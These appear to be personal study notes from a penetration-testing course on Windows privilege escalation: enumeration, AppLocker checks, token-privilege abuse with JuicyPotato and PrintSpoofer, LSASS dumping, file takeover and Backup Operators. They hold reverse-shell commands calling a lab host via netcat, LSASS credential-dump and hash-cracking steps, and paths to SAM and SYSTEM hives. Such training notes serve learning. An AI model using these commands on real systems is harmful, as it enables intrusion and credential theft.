## Starting

Check network information
```powershell
ipconfig /all 
arp -a
route print
```

Check windows defender status
```powershell-session
Get-MpComputerStatus
```

List AppLocker rules 
```powershell-session
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

Test AppLocker policy to check if cmd is denied by the policy
```powershell-session
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

To check for other thing we can modify the command for example:
```
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -Path C:\*\*\*\*\*.exe -User Everyone
```

## Initial Enumeration
Get running tasks:

```powershell
tasklist /svc
```

Get env variable and system info

```
set
systeminfo
```

If `systeminfo` doesn't display hotfixes, they may be queriable with [WMI](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page)
```cmd-session
wmic qfe
```

We can do this with PowerShell as well using the [Get-Hotfix](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-hotfix?view=powershell-7.1) cmdlet.

```powershell-session
PS C:\htb> Get-HotFix | ft -AutoSize
```

Check installed softwares and versions.
```powershell-session
Get-WmiObject -Class Win32_Product |  select Name, Version
```

Then comes favorite part, checking for open services 
```cmd-session
netstat -ano
```

Current  user's info
```powershell
query user
echo %USERNAME%
whoami /priv
whoami /groups
```

Knowing what other users are on the system is important as well. If we gained RDP access to a host using credentials we captured for a user `bob`, and see a `bob_adm` user in the local administrators group, it is worth checking for credential re-use
using net commands 

```cmd-session
net user
```

Knowing what non-standard groups are present on the host can help us determine what the host is used for, how heavily accessed it is, or may even lead to discovering a misconfiguration such as all Domain Users in the Remote Desktop or local administrators groups.
```cmd-session
net localgroup
```

and to have further info about a specific group and its users 
```cmd-session
net localgroup administrators
```
to finish it's worth checking for password policies and account information
```cmd-session
net accounts
```

some cheat- sheets for instance payload all things for an exhaustive list [PayloadAllThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
Named pipes, well i know what they are, not gonna explain them (sorry readers), but still can look them up [Named Pipes](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipes)
Listing named pipes list
```cmd-session
pipelist.exe /accepteula
```

reviewing a specific named pipe
```cmd-session
accesschk.exe /accepteula \\.\Pipe\lsass -v
accesschk.exe -accepteula -w \pipe\WindscribeService -v
```

## Windows user privileges
### SeImpersonate Example - JuicyPotato

connect to mssql with  MSSQLClient.py example, in other to escalate privileges with set Impersonate:
```shell-session
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```
Once connected we need to enable cmd shell
```shell-session
SQL> enable_xp_cmdshell
```
now we can execute cmd sessions.
```shell-session
xp_cmdshell whoami /priv

```

> [!info]
Note: We don't actually have to type `RECONFIGURE` as Impacket does this for us.

if we ever found ```SeImpersonatePrivilege``` is found, it can be used to impersonate a privileged account such as `NT AUTHORITY\SYSTEM`
We can use  [JuicyPotato](https://github.com/ohpe/juicy-potato) to exploit the `SeImpersonate` or `SeAssignPrimaryToken` privileges via DCOM/NTLM reflection abuse.
example:
```shell-session
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```
JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RoguePotato](https://github.com/antonioCoco/RoguePotato) can be used to leverage the same privileges and gain `NT AUTHORITY\SYSTEM` level access

```shell-session
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```
### SeDebugPrivilege
To run a particular application or service or assist with troubleshooting, a user might be assigned the [SeDebugPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs) instead of adding the account into the administrators group. This privilege can be assigned via local or domain group policy, under `Computer Settings > Windows Settings > Security Settings`. By default, only administrators are granted this privilege as it can be used to capture sensitive information from system memory, or access/modify kernel and application structures.

this privilege allow us to dump lssas file

> Task manager -> details -> lsass.exe -> Create dump file

We can then try to read and crack NTLM hash. using [pypykatz](https://github.com/skelsec/pypykatz)
First, transfer this [PoC script](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) over to the target system. Next we just load the script and run it with the following syntax `[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")`. Note that we must add a third blank argument `""` at the end for the PoC to work properly.

We save the scrip, we target a process id, then we execute the script. if we have **SeDebugPrivilege** set to true. again we can check by opening a powershell in high priv mod and run `whoami /priv`
```powershell
./script.ps1; [MyProcess]::CreateProcessFromParent((Get-Process "Process name lsas or winlogon ...").id, "c:\Windows\System32\cmd.exe", "")
```
Other tools such as [this one](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC) exist to pop a SYSTEM shell when we have `SeDebugPrivilege`

### SeTakeOwnershipPrivilege
[SeTakeOwnershipPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects) grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. This privilege assigns [WRITE_OWNER](https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights) rights over an object, meaning the user can change the owner within the object's security descriptor.
First start enabling it with this [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) which is detailed in [this](https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/) blog post, as well as [this](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77) one which builds on the initial concept.
to take the ownership of the filewe can use the [takeown](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown) Windows binary
```powershell-session
 takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```
We may still not be able to read the file and need to modify the file ACL using `icacls` to be able to read it.

```powershell-session
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```

these are some interesting files to look up.
```shell-session
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

## Windows Group Privileges
to see group privileges we can use the command `whoami /groups` 

### Backup Operators
Membership of this group grants its members the `SeBackup` and `SeRestore` privileges. The [SeBackupPrivilege](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges) allows us to traverse any folder and list the folder contents. which means we can copy a file from folder even tho we don't have access control entry.
but this can't be done with the normal copy command, it has so be done programmatically with [PoC](https://github.com/giuliano108/SeBackupPrivilege) to exploit the `SeBackupPrivilege`, and copy this file. First, let's import the libraries in a PowerShell session.
```powershell-session
PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
```

Let's check if `SeBackupPrivilege` is enabled by invoking `whoami /priv` or `Get-SeBackupPrivilege` cmdlet. If the privilege is disabled, we can enable it with `Set-SeBackupPrivilege`.

>[!info]
>Based on the server's settings, it might be required to spawn an elevated CMD prompt to bypass UAC and have this privilege.

